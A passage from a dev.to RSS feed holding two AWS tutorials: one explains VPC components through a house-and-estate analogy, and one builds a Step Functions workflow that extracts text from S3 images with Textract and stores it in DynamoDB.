      <title>AWS VPC: What you need to understand</title>
      <author>Sulaiman Olubiyi </author>
      <pubDate>Sun, 23 Jan 2022 18:47:01 +0000</pubDate>
      <link>https://dev.to/damdev95/aws-vpc-what-you-need-to-understand-2dbk</link>
      <guid>https://dev.to/damdev95/aws-vpc-what-you-need-to-understand-2dbk</guid>
      <description>&lt;p&gt;Have you been wondering how AWS defines the backbone of its networking service?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--rGk4VL4T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lc2249q8mnsjcdtbtqka.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--rGk4VL4T--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lc2249q8mnsjcdtbtqka.png" alt="AWS VPC diagram" width="598" height="361"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Well, this is all thanks to VPC Virtual Private Cloud, a virtual network within the AWS cloud, and it comprises the following: security groups, network access control list (NACl), subnet, route tables, internet gateway and NAT gateway.&lt;br&gt;
Using an analogy, AWS cloud can be described as an estate which contains several houses.&lt;br&gt;
A VPC is an individual house in that estate and you can place your properties in different positions in your house. Some properties may be placed in the living room while others in the bedroom. When expecting a visitor, that is, traffic from the internet. This can refer to the isolated logical network in the AWS cloud where you provision your resources such as application and database servers. The concept of VPC components are explained thus:&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--bhIR1Lw0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3wmrzasxc5kmau1jren9.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--bhIR1Lw0--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3wmrzasxc5kmau1jren9.jpg" alt="Typical Analogy of VPC in form of estate" width="880" height="466"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Internet Gateway: This is likened to the telephone in your house and it is the only way for anyone that wants to visit you to reach you. If your telephone line is off, nobody can reach your house and only the people within your house can talk to each other.
In AWS, this refers to the default route to the internet which enables your resources in the VPC to communicate with the internet.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--JjBjXePP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/56rm77btdgl2t8sy2bpz.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--JjBjXePP--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/56rm77btdgl2t8sy2bpz.jpg" alt="Image showing the estate and the visitor" width="880" height="837"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Subnets: These are logical segmentation of your resources, they can be likened to the properties in your house. The properties placed in the living room are public subnets, all your visitors can see them such as television, stereo system etc. &lt;br&gt;
In AWS, Web/Application servers are deployed in the public subnets, external users can have access to them and are reachable on the internet.&lt;br&gt;
The properties placed in your bedroom are private subnets, they are accessible within your house, that is, only your family members have access to them.&lt;br&gt;
In AWS, database servers are mostly placed in the private subnets in VPC because they are only accessible within your VPC network.&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;NAT Gateway: By default, only people staying in the living room can meet the visitors, perhaps you are in the bedroom and you want to meet the visitor, you can use your mobile phone to talk to them, but you would be the one to make a call request.&lt;br&gt;
In AWS, this allows resources deployed in the private subnets to have access to the internet, and is especially used for upgrade and software patches for database servers or to enhance the security level of the system.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--3anVmdRC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8a7pxd3aiawpvppl0txs.jpg" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--3anVmdRC--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8a7pxd3aiawpvppl0txs.jpg" alt="Security measure towards the house" width="766" height="548"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Network Access Control List: These are the security guards guarding your home, they will check the visitor,to either grant access to the building or not.&lt;br&gt;
In AWS, this serves as a security measure at the subnet level for your VPC network to deny or allow inbound and outbound traffic. At default, it allows both inbound and outbound traffic.&lt;br&gt;
Inbound traffic: User's request entering the VPC &lt;br&gt;
Outbound traffic: User's response leaving the VPC&lt;/p&gt;&lt;/li&gt;
&lt;li&gt;&lt;p&gt;Security Group: You have an electronic door which checks the visitors before they can come in. If they have an appointment or invite, they will be granted access to your living room and welcomed to your home, and when the visitor is departing, he wouldn’t be subjected to another check (stateful).&lt;br&gt;
In AWS, this is a security measure at the instance level, it only allows traffic and it is stateful which means once the traffic is allowed in, automatically the traffic will be permitted out.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I hope you understand the basics of VPC, your comments are welcome&lt;br&gt;
Cheers 😊&lt;/p&gt;

</description>
      <category>aws</category>
      <category>cloud</category>
      <category>devops</category>
    </item>
    <item>
      <title>Step Functions for making your text based images searchable</title>
      <author>Jones Zachariah Noel</author>
      <pubDate>Sun, 23 Jan 2022 18:21:45 +0000</pubDate>
      <link>https://dev.to/aws-builders/step-functions-for-making-your-text-based-images-searchable-334</link>
      <guid>https://dev.to/aws-builders/step-functions-for-making-your-text-based-images-searchable-334</guid>
      <description>&lt;p&gt;&lt;a href="https://aws.amazon.com/step-functions/"&gt;AWS Step Functions&lt;/a&gt; helps with workflow orchestration with low-code and visual editor available on the AWS web-console. Step Functions had an important announcement which allowed 200+ AWS Services to be integrated with AWS SDK, you can read about the &lt;a href="https://aws.amazon.com/about-aws/whats-new/2021/09/aws-step-functions-200-aws-sdk-integration/"&gt;announcement&lt;/a&gt;.&lt;br&gt;
In this blog-post we will look into two such SDK integrations with Step Functions - &lt;a href="https://aws.amazon.com/textract/"&gt;&lt;strong&gt;Amazon Textract&lt;/strong&gt;&lt;/a&gt; and &lt;a href="https://aws.amazon.com/dynamodb/"&gt;&lt;strong&gt;Amazon DynamoDB&lt;/strong&gt;&lt;/a&gt;.&lt;br&gt;
My previous blog posts, gives an introduction to Textract.&lt;br&gt;
&lt;/p&gt;
&lt;div class="ltag__link"&gt;
  &lt;a href="/aws-builders" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__org__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5zuWf912--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Z-NQNKRG--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/organization/profile_image/2794/88da75b6-aadd-4ea1-8083-ae2dfca8be94.png" alt="AWS Community Builders " width="150" height="150"&gt;
      &lt;div class="ltag__link__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kxOxwlY1--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s---xOiJQij--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/615180/fc1ebf14-25d7-4f09-ae53-807a0a859f9d.png" alt="" width="150" height="150"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/aws-builders/amazon-textract-with-expense-analyzing-516b" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Amazon Textract with expense analyzing&lt;/h2&gt;
      &lt;h3&gt;Jones Zachariah Noel for AWS Community Builders  ・ Oct 17 '21 ・ 5 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#textract&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#aws&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#machinelearning&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#tutorial&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;
&lt;br&gt;
To understand Step Functions' &lt;em&gt;Workflow Studio&lt;/em&gt;, you can check out  Sebastian Bille's (@tastefulelk) blog-post&lt;br&gt;
&lt;div class="ltag__link"&gt;
  &lt;a href="/aws-builders" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__org__pic"&gt;
      &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5zuWf912--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s--Z-NQNKRG--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/organization/profile_image/2794/88da75b6-aadd-4ea1-8083-ae2dfca8be94.png" alt="AWS Community Builders " width="150" height="150"&gt;
      &lt;div class="ltag__link__user__pic"&gt;
        &lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--kMOJkW1N--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://res.cloudinary.com/practicaldev/image/fetch/s---0KMh0T7--/c_fill%2Cf_auto%2Cfl_progressive%2Ch_150%2Cq_auto%2Cw_150/https://dev-to-uploads.s3.amazonaws.com/uploads/user/profile_image/269325/505c1a64-b1d1-4a2f-a52a-fcc2226c2f1d.jpg" alt="" width="150" height="150"&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
  &lt;a href="/aws-builders/step-functions-workflow-studio-with-serverless-framework-4j8m" class="ltag__link__link"&gt;
    &lt;div class="ltag__link__content"&gt;
      &lt;h2&gt;Step Functions Workflow Studio with Serverless Framework&lt;/h2&gt;
      &lt;h3&gt;Sebastian Bille for AWS Community Builders  ・ Aug 11 '21 ・ 3 min read&lt;/h3&gt;
      &lt;div class="ltag__link__taglist"&gt;
        &lt;span class="ltag__link__tag"&gt;#serverless&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#aws&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#tutorial&lt;/span&gt;
        &lt;span class="ltag__link__tag"&gt;#cloud&lt;/span&gt;
      &lt;/div&gt;
    &lt;/div&gt;
  &lt;/a&gt;
&lt;/div&gt;


&lt;h3&gt;
  &lt;a href="#key-takeaways-from-the-blog"&gt;
  &lt;/a&gt;
  Key take-aways from the blog
&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="#textract-sdk"&gt;Step Functions with Textract SDK integrations&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#dynamodb-sdk"&gt;Step Functions with DynamoDB SDK integrations&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3&gt;
  &lt;a href="#workflow-overview"&gt;
  &lt;/a&gt;
  Workflow overview
&lt;/h3&gt;

&lt;p&gt;The workflow is simple and could be invoked from the web console with parameters - &lt;code&gt;DocumentName&lt;/code&gt; and &lt;code&gt;BucketName&lt;/code&gt; which are also the parameters used for &lt;em&gt;Textract&lt;/em&gt;. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s---HPGQmWx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ppqj9kbu1p2syp5lnrkc.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s---HPGQmWx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ppqj9kbu1p2syp5lnrkc.png" alt="Workflow details" width="782" height="682"&gt;&lt;/a&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="o"&gt;{&lt;/span&gt;
  &lt;span class="s2"&gt;"Comment"&lt;/span&gt;: &lt;span class="s2"&gt;"Step Functions for making your text based images searchable which uses Textract and DynamoDB SDK intergrations"&lt;/span&gt;,
  &lt;span class="s2"&gt;"StartAt"&lt;/span&gt;: &lt;span class="s2"&gt;"AnalyzeDocument"&lt;/span&gt;,
  &lt;span class="s2"&gt;"States"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="s2"&gt;"AnalyzeDocument"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Task"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"Document"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
          &lt;span class="s2"&gt;"S3Object"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Bucket"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;BucketName"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Name.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;,
        &lt;span class="s2"&gt;"FeatureTypes"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
          &lt;span class="s2"&gt;"FORMS"&lt;/span&gt;
        &lt;span class="o"&gt;]&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"Resource"&lt;/span&gt;: &lt;span class="s2"&gt;"arn:aws:states:::aws-sdk:textract:analyzeDocument"&lt;/span&gt;,
      &lt;span class="s2"&gt;"ResultPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;params.TextractResult"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Next"&lt;/span&gt;: &lt;span class="s2"&gt;"ProcessEachText"&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;,
    &lt;span class="s2"&gt;"ProcessEachText"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
      &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Map"&lt;/span&gt;,
      &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"TextIndex.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="s2"&gt;.Map.Item.Index"&lt;/span&gt;,
        &lt;span class="s2"&gt;"TextJSON.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$$&lt;/span&gt;&lt;span class="s2"&gt;.Map.Item.Value"&lt;/span&gt;,
        &lt;span class="s2"&gt;"DocumentName.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"Iterator"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
        &lt;span class="s2"&gt;"StartAt"&lt;/span&gt;: &lt;span class="s2"&gt;"Choice"&lt;/span&gt;,
        &lt;span class="s2"&gt;"States"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
          &lt;span class="s2"&gt;"Choice"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Choice"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Choices"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
              &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;"Or"&lt;/span&gt;: &lt;span class="o"&gt;[&lt;/span&gt;
                  &lt;span class="o"&gt;{&lt;/span&gt;
                    &lt;span class="s2"&gt;"Variable"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.BlockType"&lt;/span&gt;,
                    &lt;span class="s2"&gt;"StringEquals"&lt;/span&gt;: &lt;span class="s2"&gt;"LINE"&lt;/span&gt;
                  &lt;span class="o"&gt;}&lt;/span&gt;,
                  &lt;span class="o"&gt;{&lt;/span&gt;
                    &lt;span class="s2"&gt;"Variable"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.BlockType"&lt;/span&gt;,
                    &lt;span class="s2"&gt;"StringEquals"&lt;/span&gt;: &lt;span class="s2"&gt;"WORD"&lt;/span&gt;
                  &lt;span class="o"&gt;}&lt;/span&gt;
                &lt;span class="o"&gt;]&lt;/span&gt;,
                &lt;span class="s2"&gt;"Next"&lt;/span&gt;: &lt;span class="s2"&gt;"DynamoDB PutItem"&lt;/span&gt;
              &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="o"&gt;]&lt;/span&gt;,
            &lt;span class="s2"&gt;"Default"&lt;/span&gt;: &lt;span class="s2"&gt;"Skip"&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;,
          &lt;span class="s2"&gt;"DynamoDB PutItem"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Task"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Resource"&lt;/span&gt;: &lt;span class="s2"&gt;"arn:aws:states:::aws-sdk:dynamodb:putItem"&lt;/span&gt;,
            &lt;span class="s2"&gt;"Parameters"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
              &lt;span class="s2"&gt;"TableName"&lt;/span&gt;: &lt;span class="s2"&gt;"TextractKeywordsDB"&lt;/span&gt;,
              &lt;span class="s2"&gt;"Item"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                &lt;span class="s2"&gt;"pk"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                  &lt;span class="s2"&gt;"S.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;DocumentName"&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;,
                &lt;span class="s2"&gt;"sk"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
                  &lt;span class="s2"&gt;"S.$"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TextJSON.Text"&lt;/span&gt;
                &lt;span class="o"&gt;}&lt;/span&gt;
              &lt;span class="o"&gt;}&lt;/span&gt;
            &lt;span class="o"&gt;}&lt;/span&gt;,
            &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;,
          &lt;span class="s2"&gt;"Skip"&lt;/span&gt;: &lt;span class="o"&gt;{&lt;/span&gt;
            &lt;span class="s2"&gt;"Type"&lt;/span&gt;: &lt;span class="s2"&gt;"Pass"&lt;/span&gt;,
            &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;
          &lt;span class="o"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;}&lt;/span&gt;
      &lt;span class="o"&gt;}&lt;/span&gt;,
      &lt;span class="s2"&gt;"ItemsPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;params.TextractResult.Blocks"&lt;/span&gt;,
      &lt;span class="s2"&gt;"End"&lt;/span&gt;: &lt;span class="nb"&gt;true&lt;/span&gt;,
      &lt;span class="s2"&gt;"ResultPath"&lt;/span&gt;: &lt;span class="s2"&gt;"&lt;/span&gt;&lt;span class="nv"&gt;$.&lt;/span&gt;&lt;span class="s2"&gt;TranslatedText"&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
  &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h4&gt;
  &lt;a href="#amazon-textract-analyzedocument"&gt;
  &lt;/a&gt;
  Amazon Textract : AnalyzeDocument
&lt;/h4&gt;

&lt;p&gt;In this step, we would be extracting all the textual data from a image stored on S3 bucket in the same account. &lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#map-state-proceseachtext"&gt;
  &lt;/a&gt;
  Map State : ProcesEachText
&lt;/h4&gt;

&lt;p&gt;We would have to loop with the &lt;code&gt;Blocks&lt;/code&gt; which is returned from Textract as a response. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--EBaPNx_3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mj36iu9eu41omvvz0wj0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--EBaPNx_3--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mj36iu9eu41omvvz0wj0.png" alt="Map" width="285" height="100"&gt;&lt;/a&gt;&lt;br&gt;
The inputs from previous step to Maps is defined with &lt;code&gt;parameters&lt;/code&gt;.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#choice"&gt;
  &lt;/a&gt;
  Choice
&lt;/h4&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--8filyp4E--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8stbradhklsut3kyqne0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--8filyp4E--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8stbradhklsut3kyqne0.png" alt="choice" width="880" height="193"&gt;&lt;/a&gt;&lt;br&gt;
For each item in &lt;code&gt;Block&lt;/code&gt;, we will validate if that item has &lt;code&gt;BlockType&lt;/code&gt; value either as &lt;em&gt;LINE&lt;/em&gt; or &lt;em&gt;WORD&lt;/em&gt;. If the condition matches, it proceeds to the DynamoDB step else it will just pass the item.&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#dynamodb-putitem"&gt;
  &lt;/a&gt;
  DynamoDB : PutItem
&lt;/h4&gt;

&lt;p&gt;For the items which have &lt;code&gt;BlockType&lt;/code&gt; value either as &lt;em&gt;LINE&lt;/em&gt; or &lt;em&gt;WORD&lt;/em&gt;, they are the one which have textual data so we will use the &lt;code&gt;Text&lt;/code&gt; to write into DynamoDB.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-functions-with-textract-sdk-integrations"&gt;
  &lt;/a&gt;
  Step Functions with Textract SDK integrations &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;With Textract SDK, we would be using &lt;code&gt;AnalyzeDocument&lt;/code&gt; SDK API to get the text from a image stored on S3 bucket. This API requires the &lt;code&gt;Document&lt;/code&gt; as input which has details such as &lt;code&gt;Bucket&lt;/code&gt; name and &lt;code&gt;Name&lt;/code&gt; stored on S3. Also it requires &lt;code&gt;FeatureTypes&lt;/code&gt; which commands Textract to extract text with a form base or table base. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7RK82rDN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wzqfu1zkfuh1ze7206qw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7RK82rDN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wzqfu1zkfuh1ze7206qw.png" alt="Textract" width="880" height="534"&gt;&lt;/a&gt;&lt;br&gt;
Workflow Studio, also shows the JSON definition of the step where the parameters from StepFunction input is mapped to SDK API input. The result path is also defined as it would be helpful for the Map State to look into the &lt;code&gt;Blocks&lt;/code&gt; list.&lt;br&gt;
Note : Step Functions role would create &lt;code&gt;textract:analyzedocument&lt;/code&gt; with &lt;code&gt;ALLOW&lt;/code&gt; action.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-functions-with-dynamodb-sdk-integrations"&gt;
  &lt;/a&gt;
  Step Functions with DynamoDB SDK integrations &lt;a&gt;&lt;/a&gt;
&lt;/h3&gt;

&lt;p&gt;DynamoDB SDK allows us to insert the records into DynamoDB table &lt;em&gt;TextractKeywordsDB&lt;/em&gt; with the &lt;code&gt;pk&lt;/code&gt; as the document key itself and &lt;code&gt;sk&lt;/code&gt; as the keyword which is detected from Textract.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vQG8eDME--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9aj7mwj6h5gx1msd27v6.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vQG8eDME--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9aj7mwj6h5gx1msd27v6.png" alt="DynamoDB" width="880" height="450"&gt;&lt;/a&gt;&lt;br&gt;
The JSON definition shows how the parameters are mapped with each item of the Map's iterator.&lt;br&gt;
Note : Step Functions role would create &lt;code&gt;dynamodb:putitem&lt;/code&gt; with &lt;code&gt;ALLOW&lt;/code&gt; action.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#executions-view"&gt;
  &lt;/a&gt;
  Executions view
&lt;/h3&gt;

&lt;p&gt;The &lt;strong&gt;AnalyzeDocument&lt;/strong&gt; step when the status changes to &lt;em&gt;Succeeded&lt;/em&gt;, it would show the step's output which is the JSON which Textract returns along with the metadata of each text detected.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OA3-wooj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hz42wrf0m1criw4h1hj2.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OA3-wooj--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hz42wrf0m1criw4h1hj2.png" alt="AnalyzeDocument" width="880" height="415"&gt;&lt;/a&gt;&lt;br&gt;
Whenever a map step is involved, along with the output of the complete Map execution, it also provides &lt;em&gt;Map iteration details&lt;/em&gt; which gives the overall details of how many iterations were completed, succeeded, failed, cancelled, in progress and pending.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Jg2W6-qm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1p7dkeelrsbc9xdcilzw.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Jg2W6-qm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1p7dkeelrsbc9xdcilzw.png" alt="Map" width="880" height="356"&gt;&lt;/a&gt;&lt;br&gt;
We can also navigate through all the items of the map's iterator and view each execution details. For the one which &lt;em&gt;Choice&lt;/em&gt; condition is satisfied, DynamoDB PutItem step is invoked and also successfully completed.&lt;br&gt;
